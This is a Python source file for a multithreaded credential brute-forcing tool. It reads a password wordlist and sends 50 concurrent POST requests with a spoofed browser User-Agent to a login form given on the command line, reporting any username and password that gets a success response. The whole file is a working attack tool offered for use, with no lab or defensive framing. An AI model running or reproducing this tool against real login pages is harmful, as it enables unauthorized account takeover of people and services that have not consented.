import requests
import sys
import concurrent.futures

i = 0  # Global for keeping track of current password and total passwords.
password_count = 0  # Total passwords from password list


class Login:
    def __init__(self, url: str, wordlist_path: str, username: str):
        self.url = url
        self.wordlist_path = wordlist_path
        self.username = username
        self.passwords = []

    def build_password_list(self) -> list:
        passwords = []

        with open(self.wordlist_path, 'r') as file_obj:
            for password in file_obj:
                global password_count
                password_count += 1
                self.passwords.append(password)

        print(f'Prepared wordlist in memory with {password_count} entries.')
        return passwords

    def login_workers(self):
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            futures = []

            for password in self.passwords:
                futures.append(executor.submit(self.perform_login, password.strip()))

    def perform_login(self, password: str):
        credentials = {  # form fields
            "user_id": self.username,
            "passwd": password
        }

        cookies = {
        }

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                          'Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.58'
        }

        response = requests.post(self.url, data=credentials, headers=headers)

        if "OK" in response.text:  # success text
            print(f"[+] {self.username}:{password}")
            sys.exit(0)
        else:
            global i
            global password_count
            i += 1
            print(f"{i} of {password_count}", end="\r")


def main():
    username = sys.argv[1]
    wordlist_path = sys.argv[2]
    url = sys.argv[3]

    l = Login(url, wordlist_path, username)
    l.build_password_list()  # initialize password wordlist in memory
    l.login_workers()


if __name__ == "__main__":
    main()
